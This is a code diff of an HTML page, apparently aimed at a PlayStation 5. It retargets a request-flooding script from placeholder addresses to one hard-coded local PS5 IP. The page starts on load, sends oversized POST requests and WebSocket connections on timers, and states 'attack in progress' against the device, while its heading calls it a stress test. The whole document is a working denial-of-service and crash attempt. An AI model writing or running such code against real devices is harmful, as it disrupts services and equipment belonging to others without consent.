@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ethernet Stress Test</title>
+    <title>PS5 Ethernet Attack</title>
     <style>
         body {
             background-color: #111;
@@ -12,19 +12,22 @@
     </style>
 </head>
 <body>
-    <h1>PS5 Ethernet Test</h1>
-    <div id="status">Iniciando test...</div>
+    <h1>Ethernet Stress Test PS5</h1>
+    <div id="status">Preparando...</div>
 
     <script>
+        const PS5_IP = "192.168.137.200";
+
         function floodFetch() {
-            for (let i = 0; i < 1000; i++) {
+            for (let i = 0; i < 500; i++) {
                 try {
-                    fetch(`http://192.0.2.${i % 255}/nonexistent${Math.random()}`, {
-                        method: 'GET',
+                    fetch(`http://${PS5_IP}/nonexistent_path_${Math.random()}`, {
+                        method: 'POST',
                         headers: {
-                            'X-Custom-Header': 'A'.repeat(5000), // Cabecera muy grande
-                            'X-Overflow-Attempt': 'B'.repeat(10000) // Intento de buffer overflow
+                            'X-Test-Header': 'A'.repeat(10000),
+                            'X-Corrupt-Attempt': 'B'.repeat(20000),
                         },
+                        body: 'C'.repeat(50000),
                         mode: 'no-cors',
                         cache: 'no-store',
                         keepalive: true,
@@ -36,9 +39,9 @@
         }
 
         function floodWebSocket() {
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 50; i++) {
                 try {
-                    new WebSocket(`ws://192.0.2.${i % 255}/badpath${Math.random()}`);
+                    new WebSocket(`ws://${PS5_IP}/ws_${Math.random()}`);
                 } catch (e) {
                     console.log(e);
                 }
@@ -46,9 +49,9 @@
         }
 
         function startTest() {
-            document.getElementById('status').textContent = "Lanzando ataques...";
+            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;
             setInterval(floodFetch, 500);
-            setInterval(floodWebSocket, 2000);
+            setInterval(floodWebSocket, 1500);
         }
 
         window.onload = startTest;
